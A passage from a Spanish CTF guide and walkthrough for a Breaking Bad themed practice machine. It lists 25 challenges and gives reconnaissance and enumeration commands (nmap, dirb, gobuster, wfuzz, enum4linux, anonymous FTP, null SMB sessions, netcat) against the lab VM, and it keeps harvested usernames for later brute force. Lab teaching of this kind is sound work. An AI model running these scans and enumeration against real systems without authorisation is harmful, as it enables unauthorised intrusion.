<p><span id="_Toc207189779" class="anchor"></span><strong>ğŸ® Â¿De quÃ© va
el juego?</strong></p>
<p>Te enfrentas a una <strong>mÃ¡quina CTF</strong> compuesta por
<strong>25 retos</strong> cuidadosamente distribuidos en dos
categorÃ­as:</p>
<p><span id="_Toc207189780" class="anchor"></span><strong>ğŸ Las Moscas
(10 retos)</strong></p>
<ul>
<li><p>Inspiradas en el mÃ­tico capÃ­tulo â€œLa Moscaâ€.</p></li>
<li><p>EstÃ¡n <strong>ocultas en el entorno web</strong> de la
mÃ¡quina.</p></li>
<li><p>Puedes capturarlas sin salir del navegador, explorando el cÃ³digo
fuente, las rutas ocultas y los elementos sospechosos.</p></li>
<li><p>Al ser mÃ¡s accesibles, probablemente sean <strong>mÃ¡s fÃ¡ciles de
resolver</strong>.</p></li>
<li><p>Â¡AtrÃ¡palas todas y comprueba tu caza en la <strong>pÃ¡gina de
verificaciÃ³n de moscas</strong>!</p></li>
</ul>
<p><span id="_Toc207189781" class="anchor"></span><strong>ğŸš© Las
Banderas (15 retos)</strong></p>
<ul>
<li><p><strong>Esconden secretos mÃ¡s profundos</strong>, ocultos dentro
del servidor.</p></li>
<li><p>Requieren tÃ©cnicas mÃ¡s elaboradas como:</p>
<ul>
<li><p>Escalada de privilegios</p></li>
<li><p>InyecciÃ³n</p></li>
<li><p>EnumeraciÃ³n</p></li>
<li><p>Lectura de archivos protegidos</p></li>
</ul></li>
<li><p>Â¡AquÃ­ se juega en serio! Las banderas estÃ¡n donde menos te lo
esperasâ€¦ pero si sabes mirar, ahÃ­ estarÃ¡n.</p></li>
<li><p>Cuando creas haber atrapado una, <strong>verifÃ­cala en las
pÃ¡ginas de comprobaciÃ³n de banderas y moscas</strong>. Note voy a decir
donde estÃ¡n esas pÃ¡ginas porque eso es tarea tuya.</p></li>
</ul>
<p><span id="_Toc207189782" class="anchor"></span><strong>âš ï¸ Reglas del
juego</strong></p>
<ul>
<li><p>âŒ <strong>No hagas trampas.</strong> Muchas de las Flags se
pueden obtener de diferentes maneras; el reto no es solo conseguir la
Flag sino explotar la vulnerabilidad correspondiente. Consultar
soluciones mata la esencia del juego.</p></li>
<li><p>ğŸ¯ Este reto estÃ¡ hecho para <strong>aprender y
disfrutar</strong> del proceso, no para correr al final.</p></li>
<li><p>ğŸ§  Si algo parece fÃ¡cilâ€¦ probablemente lo sea. Pero si parece
imposible, tal vez no lo sea tanto.</p></li>
</ul>
<p><span id="_Toc207189783" class="anchor"></span><strong>ğŸ§© Pistas y
secretos del servidor</strong></p>
<ul>
<li><p>La fase de reconocimiento es la mÃ¡s importante. Hacerte con la
mayor cantidad de informaciÃ³n de facilitarÃ¡ encontrar los
retos.</p></li>
<li><p>Busca por todos los directorios, por TODOS.</p></li>
<li><p>La DEA estÃ¡ detrÃ¡s de los asuntos de Fring y tratan de cazarlo
con trampas; procura no caer en ellas.</p></li>
</ul>
<p><span id="_Toc207189784" class="anchor"></span><strong>ğŸ¯ Objetivo
final</strong></p>
<p>âœ… Captura todas las <strong>Moscas</strong>.<br />
âœ… Encuentra todas las <strong>Banderas</strong>.<br />
ğŸ§  Y sobre todo: <strong>aprende, experimenta y juega
limpiamente</strong>.</p>
<p><em>"El respeto se gana, el poder se toma, y los secretos... se
descifran."</em><br />
â€” Gustavo Fring</p>
<p>Â¿EstÃ¡s listo/a para entrar al laboratorio? ğŸ§ª<br />
Â¡Que comience el juego!</p>
<p><strong><br />
</strong></p>
<h1
id="guÃ­a-de-orden-de-resoluciÃ³n-ctf-los-pollos-hermanos-braking-server"><strong>ğŸ•µï¸â€â™‚ï¸
GuÃ­a de Orden de ResoluciÃ³n CTF: Los Pollos Hermanos Braking
Server</strong></h1>
<p><strong>VersiÃ³n de referencia para jugadores</strong><br />
<strong>Autor:</strong> JosÃ© PÃ©rez (www.unfantasmaenelsistema.com)<br />
<strong>Modo de juego:</strong> MÃ¡quina tipo CTF con 25 retos<br />
<strong>Requisitos previos:</strong> ConexiÃ³n desde Kali Linux u otro
entorno ofensivo</p>
<p><span id="_Toc207189786" class="anchor"></span><strong>ğŸ” DescripciÃ³n
General</strong></p>
<p>Este documento organiza los 25 retos (10 moscas y 15 banderas) en un
orden recomendado para el jugador. El objetivo es guiarle por una
progresiÃ³n lÃ³gica de dificultad, narrativa y aprendizaje tÃ©cnico. El CTF
estÃ¡ inspirado en el universo de <em>Breaking Bad</em>, con personajes,
contraseÃ±as y pruebas interconectadas.</p>
<p><span id="_Toc207189787" class="anchor"></span><strong>ğŸ Parte 1:
Las Moscas (CriptografÃ­a - SteganografÃ­a - Forense - WEB - OSINT - Red -
Misc)</strong></p>
<table>
<colgroup>
<col style="width: 6%" />
<col style="width: 14%" />
<col style="width: 38%" />
<col style="width: 40%" />
</colgroup>
<thead>
<tr>
<th style="text-align: center;"><strong>ğŸ§© NÂº</strong></th>
<th style="text-align: center;"><strong>Nombre de Mosca</strong></th>
<th style="text-align: center;"><strong>Tipo</strong></th>
<th
style="text-align: center;"><strong>ExplotaciÃ³n/Vulnerabilidad</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Mosca 1</td>
<td>Criptog. + SteganografÃ­a</td>
<td>Hex + Espectograma</td>
</tr>
<tr>
<td>2</td>
<td>Mosca 2</td>
<td>CriptografÃ­a + Forense</td>
<td>Brainfuck + Exiftool</td>
</tr>
<tr>
<td>3</td>
<td>Mosca 3</td>
<td>CriptografÃ­a + Misc</td>
<td>QR + Editor Hex</td>
</tr>
<tr>
<td>4</td>
<td>Mosca 4</td>
<td>CriptografÃ­a + WEB</td>
<td>Pigpen + SQL Injection</td>
</tr>
<tr>
<td>5</td>
<td>Mosca 5</td>
<td>Forense</td>
<td>Crackeo RAR</td>
</tr>
<tr>
<td>6</td>
<td>Mosca 6</td>
<td>CriptografÃ­a + Misc</td>
<td>Imagen tÃ©rmica + Braille</td>
</tr>
<tr>
<td>7</td>
<td>Mosca 7</td>
<td>CriptografÃ­a + Misc</td>
<td>Octal + Hash</td>
</tr>
<tr>
<td>8</td>
<td>Mosca 8</td>
<td>CriptografÃ­a + OSINT</td>
<td>Base64 + InvestigaciÃ³n</td>
</tr>
<tr>
<td>9</td>
<td>Mosca 9</td>
<td>Criptog. + SteganografÃ­a</td>
<td>ROT9 + DTMF Audio</td>
</tr>
<tr>
<td>10</td>
<td>Mosca 10</td>
<td>CriptografÃ­a + Red</td>
<td>Atbash + pcap HTTP</td>
</tr>
</tbody>
</table>
<p><span id="_Toc207189788" class="anchor"></span><strong>âš™ï¸ Parte 2:
Las Banderas (Sistemas, Red, Forense)</strong></p>
<table>
<colgroup>
<col style="width: 4%" />
<col style="width: 18%" />
<col style="width: 37%" />
<col style="width: 40%" />
</colgroup>
<thead>
<tr>
<th style="text-align: center;"><strong>NÂº</strong></th>
<th style="text-align: center;"><strong>Bandera</strong></th>
<th style="text-align: center;"><strong>CategorÃ­a</strong></th>
<th
style="text-align: center;"><strong>ExplotaciÃ³n/Vulnerabilidad</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>11</td>
<td>Bandera 1</td>
<td>Privilegios</td>
<td>sudoers</td>
</tr>
<tr>
<td>12</td>
<td>Bandera 2</td>
<td>Red</td>
<td>FTP anÃ³nimo</td>
</tr>
<tr>
<td>13</td>
<td>Bandera 3</td>
<td>Privilegios</td>
<td>SUID</td>
</tr>
<tr>
<td>14</td>
<td>Bandera 4</td>
<td>Forense</td>
<td>archivos sin ext.</td>
</tr>
<tr>
<td>15</td>
<td>Bandera 5</td>
<td>Red / Forense</td>
<td>AnÃ¡lisis en Wireshark</td>
</tr>
<tr>
<td>16</td>
<td>Bandera 6</td>
<td>Red / Exploit</td>
<td>Samba CVE-2017</td>
</tr>
<tr>
<td>17</td>
<td>Bandera 7</td>
<td>Red / Brute-force</td>
<td>SSH dÃ©bil</td>
</tr>
<tr>
<td>18</td>
<td>Bandera 8</td>
<td>Red / Forense</td>
<td>Certificado oculto</td>
</tr>
<tr>
<td>19</td>
<td>Bandera 9</td>
<td>Red / Recon</td>
<td>Netcat</td>
</tr>
<tr>
<td>20</td>
<td>Bandera 10</td>
<td>Web Exploitation</td>
<td>LFI PHP</td>
</tr>
<tr>
<td>21</td>
<td>Bandera 11</td>
<td>CriptografÃ­a / Puzzle</td>
<td>Guion PDF</td>
</tr>
<tr>
<td>22</td>
<td>Bandera 12</td>
<td>Warm-up</td>
<td>Permisos</td>
</tr>
<tr>
<td>23</td>
<td>Bandera 13</td>
<td>Forense / Logs</td>
<td>logs ocultos</td>
</tr>
<tr>
<td>24</td>
<td>Bandera 14</td>
<td>Forense / Memoria</td>
<td>Volcado memoria</td>
</tr>
<tr>
<td>25</td>
<td>Bandera 15</td>
<td>Pwn / Exploit binario</td>
<td>Buffer Overflow</td>
</tr>
</tbody>
</table>
<p><span id="_Toc207189789" class="anchor"></span><strong>ğŸ§ 
Recomendaciones para los Jugadores</strong></p>
<ul>
<li><p><strong>Utiliza Kali Linux</strong>: Las herramientas necesarias
estÃ¡n preinstaladas.</p></li>
<li><p><strong>Comienza desde la Web</strong>: Inspecciona fuente,
analiza imÃ¡genes, descifra.</p></li>
<li><p><strong>Escanea puertos regularmente</strong>: Muchos retos estÃ¡n
ocultos.</p></li>
<li><p><strong>No subestimes los logs ni archivos sin
extensiÃ³n</strong>.</p></li>
<li><p><strong>Trabaja con binarios en entornos 32-bit si es
posible</strong>.</p></li>
<li><p><strong>Lee la narrativa</strong>: Muchas pistas estÃ¡n conectadas
con los personajes.</p></li>
</ul>
<p><span id="_Toc207189790" class="anchor"></span><strong>ğŸ“
Observaciones del Autor</strong></p>
<ul>
<li><p>Los retos permiten resoluciÃ³n libre, pero este orden favorece el
flujo y aprendizaje.</p></li>
<li><p>Hay desafÃ­os diseÃ±ados con un toque cinematogrÃ¡fico y tÃ©cnico que
simulan la dualidad Walter/Gus.<strong><br />
</strong></p></li>
</ul>
<h1
id="introducciÃ³n-al-walkthrough-mÃ¡quina-ctf-los-pollos-hermanos-breaking-server"><strong>ğŸ§¬
IntroducciÃ³n al Walkthrough: MÃ¡quina CTF â€œLos Pollos Hermanos Breaking
Serverâ€</strong></h1>
<p>La mÃ¡quina estÃ¡ diseÃ±ada como una experiencia CTF integral que simula
diferentes escenarios del universo <em>Breaking Bad</em>â€”cargada de
desafÃ­os tÃ©cnicos, criptogrÃ¡ficos, forenses y de explotaciÃ³n activa.
Cada reto estÃ¡ cuidadosamente ambientado y enlazado con elementos
narrativos que potencian el realismo y el aprendizaje tÃ©cnico.</p>
<p><span id="_Toc207189792" class="anchor"></span><strong>ğŸ—‚ï¸ CategorÃ­as
de retos incluidas</strong></p>
<table>
<colgroup>
<col style="width: 26%" />
<col style="width: 44%" />
<col style="width: 29%" />
</colgroup>
<thead>
<tr>
<th style="text-align: center;"><strong>CategorÃ­a</strong></th>
<th style="text-align: center;"><strong>Subtipos y tÃ©cnicas
usadas</strong></th>
<th style="text-align: center;"><strong>Retos asociados</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>ğŸ” CriptografÃ­a</td>
<td>Hashing, frase oculta en documento, steganografÃ­a</td>
<td>Mosca 1â€“10, Bandera 7, 8, 11</td>
</tr>
<tr>
<td>ğŸ§¬ EsteganografÃ­a</td>
<td>Espectograma, audio DTMF, imagen tÃ©rmica, PDF oculto</td>
<td>Mosca 1, 6, 9, Bandera 4, 14</td>
</tr>
<tr>
<td>ğŸ” Forense</td>
<td>Logs falsificados, ctime manipulado, anÃ¡lisis de RAM</td>
<td>Mosca 2, 5, Bandera 4, 12, 13, 14</td>
</tr>
<tr>
<td>ğŸ“¦ Red</td>
<td>FTP anÃ³nimo, anÃ¡lisis de .pcap (DNS, TLS, HTTP)</td>
<td>Bandera 2, 5, 8, 10</td>
</tr>
<tr>
<td>ğŸ›¡ï¸ Pwn</td>
<td>Exploits en Samba, SSH, Buffer Overflow</td>
<td>Bandera 3, 6, 7, 15</td>
</tr>
<tr>
<td>ğŸ•µï¸ Web Exploitation</td>
<td>InyecciÃ³n SQL, LFI, formularios inseguros</td>
<td>Mosca 4, Bandera 10</td>
</tr>
<tr>
<td>ğŸ§  Reconocimiento</td>
<td>Escaneo de puertos, enumeraciÃ³n</td>
<td>Bandera 9</td>
</tr>
<tr>
<td>ğŸ“œ Misc / OSINT</td>
<td>QR, bÃºsqueda de desaparecida, anÃ¡lisis de exif</td>
<td>Mosca 3, 8</td>
</tr>
</tbody>
</table>
<p><span id="_Toc207189793" class="anchor"></span><strong>âš™ï¸ Modalidades
de interacciÃ³n</strong></p>
<ul>
<li><p><strong>EstÃ¡ticas:</strong> DesafÃ­os de anÃ¡lisis y
decodificaciÃ³n.</p></li>
<li><p><strong>DinÃ¡micas:</strong> Retos con interacciÃ³n en tiempo real
(servicios corriendo).</p></li>
<li><p><strong>Narrativas:</strong> Retos escondidos en artefactos tipo
serie (PDFs, diÃ¡logos, nombres de personajes).</p></li>
</ul>
<p><span id="_Toc207189794" class="anchor"></span><strong>ğŸ’¥ Objetivo
formativo</strong></p>
<p>Este CTF estÃ¡ orientado tanto a jugadores novatos como intermedios,
incluyendo retos:</p>
<ul>
<li><p><strong>Reconocibles por firmas clÃ¡sicas</strong> (LFI, SUID,
sudoers).</p></li>
<li><p><strong>Adaptables a tÃ©cnicas avanzadas</strong> (CVE, binarios,
espectro de audio).</p></li>
<li><p><strong>Con lecciones de buenas prÃ¡cticas de seguridad</strong>,
como el uso de permisos, validaciÃ³n de inputs, y anÃ¡lisis de
logs.</p></li>
</ul>
<p>ğŸ¬ Cada reto representa una pieza del rompecabezas narrativo con
guiÃ±os al universo de <em>Breaking Bad</em>. Desde claves ocultas en el
espectro de audio hasta banderas que sÃ³lo aparecen si â€œel tiempo se
corrigeâ€, esta mÃ¡quina exige observaciÃ³n, curiosidad y anÃ¡lisis
tÃ©cnico.</p>
<p><strong><br />
</strong></p>
<h1 id="personajes"><strong>ğŸ” Personajes</strong></h1>
<p><strong>Personajes simulados en esta mÃ¡quina:</strong></p>
<p><strong>Mike Ehrmantraut</strong></p>
<ul>
<li><p>Rol: Jefe de seguridad, investigador y sicario.</p></li>
<li><p>FunciÃ³n: Protege los intereses de Gus, investiga amenazas,
realiza trabajos sucios y coordina la logÃ­stica y la
vigilancia.</p></li>
</ul>
<p><strong>Victor</strong></p>
<ul>
<li><p>Rol: Asistente y ejecutor.</p></li>
<li><p>FunciÃ³n: Hombre de confianza de Gus. Ayuda a supervisar las
operaciones, vigila a Walter y Jesse, y realiza tareas de
campo.</p></li>
</ul>
<p><strong>Tyrus Kitt</strong></p>
<ul>
<li><p>Rol: Guardaespaldas y ejecutor.</p></li>
<li><p>FunciÃ³n: Reemplaza a Victor como principal asistente de campo
tras su muerte. Fiel y reservado.</p></li>
</ul>
<p><strong>Lydia Rodarte-Quayle</strong></p>
<ul>
<li><p>Rol: Proveedora de quÃ­micos.</p></li>
<li><p>FunciÃ³n: Contacto corporativo que ayuda a suministrar metilamina
para la producciÃ³n de metanfetamina. Aunque aparece mÃ¡s en Better Call
Saul y temporadas finales.</p></li>
</ul>
<p><strong>HÃ©ctor Salamanca</strong></p>
<ul>
<li><p>Rol: Miembro del cÃ¡rtel de JuÃ¡rez.</p></li>
<li><p>FunciÃ³n: Antiguo rival de Gus, pero tuvo conexiones con Ã©l y su
red en el pasado. Importante por su historia compartida.</p></li>
</ul>
<p><strong>Duane Chow</strong></p>
<ul>
<li><p>ProfesiÃ³n: DueÃ±o de una empresa de suministros quÃ­micos
industriales: Chow's Industrial Supply.</p></li>
<li><p>RelaciÃ³n con Gus Fring: Chow era uno de los distribuidores y
colaboradores delictivos de Gus, ayudando a suministrar materiales
necesarios para la producciÃ³n de metanfetamina (como precursores
quÃ­micos).</p></li>
</ul>
<p><strong>Saul Goodman</strong></p>
<ul>
<li><p>Rol: Abogado criminalista "del crimen" y asesor legal de Walter
White y Jesse Pinkman.</p></li>
<li><p>FunciÃ³n: Ayuda a Walter y Jesse a sortear problemas legales y a
ocultar sus actividades delictivas. Introduce a Walter con personajes
mÃ¡s peligrosos como Mike Ehrmantraut (su "solucionador") y Gus Fring (su
red de distribuciÃ³n de drogas). DiseÃ±a estrategias para legalizar las
ganancias ilÃ­citas de Walter, como la compra del lavado de
autos.</p></li>
</ul>
<p><strong>Gustavo Fring</strong></p>
<ul>
<li><p>Rol: Empresario aparentemente respetable que, en secreto, es un
importante narcotraficante.</p></li>
<li><p>FunciÃ³n: Controla una red de distribuciÃ³n de drogas en el
suroeste de EE. UU. Recluta a Walter White como cocinero por la pureza
de su metanfetamina. Representa una versiÃ³n calculadora, frÃ­a y
profesional del crimen. Su existencia fuerza a Walter a volverse mÃ¡s
despiadado para sobrevivir.</p></li>
</ul>
<p><strong>Jesse_Pinkman</strong></p>
<ul>
<li><p>Rol: socio y aprendiz de Walter White en la producciÃ³n de
metanfetamina. Representa el conflicto moral, la lealtad emocional y la
parte humana del negocio criminal.</p></li>
<li><p>FunciÃ³n: Es el primer enlace de Walter con el mundo del
narcotrÃ¡fico. Walter lo busca inicialmente porque Jesse ya tiene
experiencia como "cocinero" y distribuidor. Mientras Walter se
deshumaniza, Jesse se culpabiliza, sufre y se cuestiona las
consecuencias del negocio.</p></li>
</ul>
<p><strong>Gale Boetticher</strong></p>
<ul>
<li><p>Rol: QuÃ­mico brillante y meticuloso.</p></li>
<li><p>FunciÃ³n: ser la mano derecha de Gus Fring en la producciÃ³n de
metanfetamina. Gus lo contratÃ³ para diseÃ±ar y operar el superlaboratorio
subterrÃ¡neo, con el objetivo de perfeccionar el proceso de cocinado y,
finalmente, reemplazar a Walter White. Gale representaba la alternativa
"segura" y profesional: un cientÃ­fico que podÃ­a producir metanfetamina
de la mÃ¡s alta pureza sin el ego ni el caos que acompaÃ±aban a Walter
White.</p></li>
</ul>
<p><strong>Walter White</strong></p>
<ul>
<li><p>Walter White es el personaje principal de la serie "Breaking
Bad". Su rol y funciÃ³n en la historia evolucionan drÃ¡sticamente a lo
largo de las temporadas. Al principio, es un profesor de quÃ­mica de
instituto, con una vida anodina y un trabajo que apenas le da para
mantener a su familia. Su rol inicial es el de un hombre de familia
comÃºn y corriente, que se ve enfrentado a una situaciÃ³n lÃ­mite: le
diagnostican un cÃ¡ncer de pulmÃ³n inoperable.</p></li>
<li><p>A partir de este diagnÃ³stico, su funciÃ³n en la serie cambia por
completo. Deja de ser un simple profesor para convertirse en un
criminal. Con el tiempo, su rol se transforma aÃºn mÃ¡s. Pasa de ser un
hombre asustado y forzado por las circunstancias a ser un
narcotraficante ambicioso y despiadado, conocido como
"Heisenberg".</p></li>
</ul>
<p><strong><br />
</strong></p>
<h1 id="fase-0-reconocimiento-y-recopilaciÃ³n-inicial"><strong>ğŸ§­ Fase 0
â€“ Reconocimiento y RecopilaciÃ³n Inicial</strong></h1>
<p><span id="_Toc207189797" class="anchor"></span><strong>ğŸ¯
Objetivo:</strong></p>
<p>Identificar y mapear servicios disponibles, arquitectura de la
mÃ¡quina, archivos visibles, tecnologÃ­as web, posibles pistas y
vulnerabilidades.</p>
<p>El comando inicial mÃ¡s habitual serÃ­a un <strong>escaneo de
descubrimiento de hosts</strong> en tu rango de red:</p>
<p>nmap -sn 192.168.1.0/24</p>
<p><img src="cookbook/media/image2.png"
style="width:5.90556in;height:4.61319in" /></p>
<p><img src="cookbook/media/image3.png"
style="width:5.90556in;height:4.23056in" /></p>
<p>ğŸ” <strong>ExplicaciÃ³n rÃ¡pida</strong>:</p>
<ul>
<li><p>-sn â†’ Solo hace "ping scan" (host discovery), sin escanear
puertos.</p></li>
<li><p>192.168.1.0/24 â†’ Cambia este rango por el que corresponda a tu
red virtual.</p>
<ul>
<li><p>Para saberlo, en Kali ejecuta:</p></li>
<li><p>ip a</p></li>
</ul></li>
</ul>
<p>y revisa la IP de tu interfaz de red (por ejemplo, 192.168.56.x si
usas Host-Only, o 10.0.2.x si usas NAT).</p>
<p>ğŸ’¡ Tip: En VirtualBox, si usas <strong>Adaptador puente</strong>, es
probable que tu red sea la misma que la de tu router domÃ©stico, asÃ­ que
el rango podrÃ­a ser 192.168.1.0/24.<br />
Si usas <strong>Host-Only</strong>, el rango habitual es
192.168.56.0/24.</p>
<p>Ahora que ya conoces la IP de la mÃ¡quina vÃ­ctima, puedes hacer un
escaneo de puertos y servicios con <strong>nmap</strong>.</p>
<p>Para un anÃ¡lisis inicial rÃ¡pido:</p>
<p>nmap -sS -sV -O 192.168.1.44</p>
<p>ğŸ” <strong>QuÃ© hace cada parÃ¡metro</strong>:</p>
<ul>
<li><p>-sS â†’ Escaneo SYN (rÃ¡pido y sigiloso).</p></li>
<li><p>-sV â†’ Detecta versiones de servicios.</p></li>
<li><p>-O â†’ Intenta identificar el sistema operativo.</p></li>
</ul>
<p><img src="cookbook/media/image4.png"
style="width:5.90556in;height:4.68056in" /></p>
<p>AquÃ­ ya podemos ver algo que pone bandera
â€˜Estoy_en_el_negocio_del_imperioâ€™</p>
<p>Si quieres <strong>no dejarte ningÃºn puerto</strong>, usa un escaneo
mÃ¡s completo:</p>
<p>nmap -p- -sS 192.168.1.44</p>
<p><em>(Escanea todos los puertos TCP, 1 al 65535, pero sin detecciÃ³n de
versiones todavÃ­a)</em></p>
<p><img src="cookbook/media/image5.png"
style="width:5.90556in;height:2.26736in" /></p>
<p>Luego, con los puertos detectados, profundizas:</p>
<p>nmap -p PUERTOS_ENCONTRADOS -sV -sC 192.168.1.44</p>
<p>Esos puertos ya nos dicen bastante sobre el terreno que vamos a pisar
ğŸ˜.<br />
Podemos organizar la <strong>profundizaciÃ³n</strong> por puerto,
priorizando los que suelen dar mÃ¡s juego en un CTF.</p>
<p><span id="_Toc207189798" class="anchor"></span><strong>ğŸ” Paso 1 â€“
Escaneo detallado con Nmap sobre los puertos encontrados</strong></p>
<p>nmap -p 21,22,80,139,445,31337 -sV -sC 192.168.1.44</p>
<p>Esto nos darÃ¡:</p>
<ul>
<li><p>Versiones exactas de servicios.</p></li>
<li><p>Scripts NSE bÃ¡sicos (banner grabbing, enumeraciÃ³n inicial SMB,
etc.).</p></li>
</ul>
<p><img src="cookbook/media/image6.png"
style="width:5.90556in;height:4.76319in" /></p>
<p><img src="cookbook/media/image7.png"
style="width:5.90556in;height:4.90486in" /></p>
<p><span id="_Toc207189799" class="anchor"></span><strong>ğŸ“‚ Paso 2 â€“
EnumeraciÃ³n por servicio</strong></p>
<p><strong>Puerto 21 (FTP)</strong></p>
<p>Ver si permite <strong>acceso anÃ³nimo</strong>:</p>
<p>ftp 192.168.1.44</p>
<p>Usuario: anonymous, sin contraseÃ±a o con email.</p>
<p>Si hay acceso, listar y descargar archivos.</p>
<p>Si estÃ¡ cerrado pero detectas versiÃ³n vulnerable (por ej. vsftpd
2.3.4), buscar exploits en:</p>
<p>searchsploit vsftpd</p>
<p><img src="cookbook/media/image8.png"
style="width:5.90556in;height:1.63611in" /></p>
<p><strong>Puerto 22 (SSH)</strong></p>
<p>Suele ser puerta final para ganar acceso, no tanto inicial.</p>
<p>Apuntar versiÃ³n de SSH para ver si hay vulnerabilidades
conocidas.</p>
<p>No hacer fuerza bruta todavÃ­a (ruido innecesario), salvo que tengas
un usuario vÃ¡lido.</p>
<p><img src="cookbook/media/image9.png"
style="width:5.90556in;height:2.24236in" /></p>
<p><strong>Puerto 80 (HTTP)</strong></p>
<p>Abrir en navegador: http://192.168.1.44</p>
<p>Enumerar con:</p>
<p>dirb http://192.168.1.44 /usr/share/wordlists/dirb/common.txt</p>
<p><img src="cookbook/media/image10.png"
style="width:5.90556in;height:2.77986in" /></p>
<p><img src="cookbook/media/image11.png"
style="width:5.90556in;height:4.15347in" /></p>
<p>Si quieres mÃ¡s profundidad:</p>
<p>dirb http://192.168.1.44 /usr/share/wordlists/dirb/big.txt</p>
<p><img src="cookbook/media/image12.png"
style="width:5.90556in;height:3.98681in" /></p>
<p><strong>WFuzz</strong> (mÃ¡s flexible)</p>
<p>wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 <a
href="http://192.168.1.44/FUZZ"><u>http://192.168.1.44/FUZZ</u></a></p>
<p>--hc 404 â†’ Oculta las respuestas con cÃ³digo 404.</p>
<p>nikto -h 192.168.1.44</p>
<p>Revisar cÃ³digo fuente, robots.txt, etc.</p>
<p><img src="cookbook/media/image13.png"
style="width:5.90556in;height:2.65972in" /></p>
<p><strong>Puertos 139 y 445 (SMB)</strong></p>
<p>Enumerar recursos compartidos:</p>
<p>smbclient -L //192.168.1.44</p>
<p>Usuario vacÃ­o o guest sin contraseÃ±a.</p>
<p>Usar enum4linux:</p>
<p>enum4linux -a 192.168.1.44</p>
<p>Si hay shares accesibles, entrar y listar contenido.</p>
<p><img src="cookbook/media/image14.png"
style="width:5.90556in;height:0.36736in" /></p>
<p><strong>Puerto 31337</strong></p>
<p>NÃºmero inusual â†’ posible servicio personalizado o backdoor.</p>
<p>Conectarte y ver respuesta:</p>
<p>nc 192.168.1.44 31337</p>
<p>Si habla algÃºn protocolo (telnet, HTTP, chat, etc.), interactuar y
analizar.</p>
<p><img src="cookbook/media/image15.png"
style="width:5.90556in;height:0.49861in" /></p>
<p>ğŸ’¡ Lo ideal:<br />
Primero agotar informaciÃ³n con <strong>FTP, HTTP y SMB</strong>, porque
suelen dar credenciales o ficheros que despuÃ©s permiten entrar por SSH o
explotar el servicio raro en el 31337.</p>
<p>ğŸ“Œ -sC â†’ Ejecuta scripts NSE bÃ¡sicos de enumeraciÃ³n, muy Ãºtil en
CTF.</p>
<p>Si tienes los puertos <strong>139 y 445</strong> abiertos, enum4linux
es una gran opciÃ³n para enumerar usuarios y shares SMB.</p>
<p><strong>Comando recomendado para enumeraciÃ³n completa:</strong></p>
<p>enum4linux -a 192.168.1.44</p>
<p>-a â†’ Lanza todas las pruebas (usuarios, shares, polÃ­ticas, SID,
etc.).</p>
<p>Te listarÃ¡ posibles <strong>nombres de usuario</strong> y
<strong>recursos compartidos</strong>.</p>
<p>Si el servidor SMB permite null sessions, obtendrÃ¡s bastante
informaciÃ³n.</p>
<p><img src="cookbook/media/image16.png"
style="width:5.90556in;height:1.65in" /></p>
<p><img src="cookbook/media/image17.png"
style="width:5.90556in;height:2.62153in" /></p>
<p><img src="cookbook/media/image18.png"
style="width:5.90556in;height:4.68681in" /></p>
<p><img src="cookbook/media/image19.png"
style="width:4.52083in;height:1.16667in" /></p>
<p><img src="cookbook/media/image20.png"
style="width:5.90556in;height:4.69722in" /></p>
<p><strong>Si quieres solo enumerar usuarios:</strong></p>
<p>enum4linux -U 192.168.1.44</p>
<p>MÃ¡s rÃ¡pido y centrado en usuarios.</p>
<p><img src="cookbook/media/image21.png"
style="width:5.90556in;height:2.18958in" /></p>
<p><strong>TambiÃ©n puedes usar rpcclient para confirmar:</strong></p>
<p>rpcclient -U "" 192.168.1.44</p>
<p><em>(Deja la contraseÃ±a vacÃ­a cuando te lo pida)</em><br />
Luego, en la consola interactiva:</p>
<p>enumdomusers</p>
<p>ğŸ“Œ Consejo CTF: Guarda bien los nombres de usuario que aparezcan,
porque luego pueden servir para <strong>fuerza bruta en SMB, SSH o el
servicio raro en el puerto 31337</strong>.</p>
<p>Para encontrar todos los directorios y pÃ¡ginas web, incluyendo con
extensiones variadas como .php, .html, .js, etc., puedes usar
herramientas de fuerza bruta de directorios con wordlists amplias y que
prueben muchas extensiones. AquÃ­ tienes las opciones mÃ¡s usadas y
efectivas:</p>
<p><strong>1ï¸âƒ£ Dirb (simple y rÃ¡pido)</strong></p>
<p>dirb http://192.168.1.44 /usr/share/wordlists/dirb/common.txt -X
.php,.html,.js,.txt,.bak</p>
<p><img src="cookbook/media/image22.png"
style="width:5.90556in;height:3.40903in" /></p>
<p>-X permite especificar extensiones a probar.</p>
<p>Prueba con extensiones comunes ademÃ¡s de las tÃ­picas.</p>
<p><strong>2ï¸âƒ£ Gobuster (mÃ¡s flexible)</strong></p>
<p>gobuster dir -u http://192.168.1.44 -w
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x
php,html,js,txt,bak</p>
<p>-x para extensiones.</p>
<p>Usa un wordlist mÃ¡s grande para mayor cobertura.</p>
<p><strong>3ï¸âƒ£ WFuzz (muy configurable)</strong></p>
<p>wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 -u
http://192.168.1.44/FUZZ.php</p>
<p>Cambia la extensiÃ³n en el URL para probar varias.</p>
<p>Para probar muchas extensiones puedes hacer varios comandos o
scripts.</p>
<p><strong>4ï¸âƒ£ Burp Suite (interactivo)</strong></p>
<p>Si prefieres interfaz grÃ¡fica y mÃ¡s control, Burp Suite tiene una
funciÃ³n de <em>Intruder</em> para fuzzing de rutas con mÃºltiples
extensiones y payloads.</p>
<p><span id="_Toc207189800"
class="anchor"></span><strong>Consejos:</strong></p>
<ul>
<li><p>Combina varias extensiones en tus pruebas para no perder
nada.</p></li>
<li><p>Usa wordlists grandes y especÃ­ficas para directorios y archivos
web.</p></li>
<li><p>Si quieres buscar tambiÃ©n ficheros sin extensiÃ³n o con nombres
raros, usa wordlists mÃ¡s amplias o crea la tuya propia.</p></li>
<li><p>No te olvides de revisar tambiÃ©n la pÃ¡gina principal (/) y sus
scripts para posibles pistas.</p></li>
</ul>
<p><strong>ğŸ“ AnÃ¡lisis de las URLs</strong></p>
<p>Una vez entramos al index podemos ver que el resto de directorios es
accesible en formato de pÃ¡gina web del restaurante Los Pollos
Hermanos.</p>
<p><strong>URLs:</strong></p>
<p><a
href="http://192.168.1.44/server-status">http://192.168.1.44/server-status</a></p>
<p>El status del server no devuelve nada raro o interesante:</p>
<p><img src="cookbook/media/image23.png"
style="width:5.90556in;height:1.91944in" /></p>
<p><a
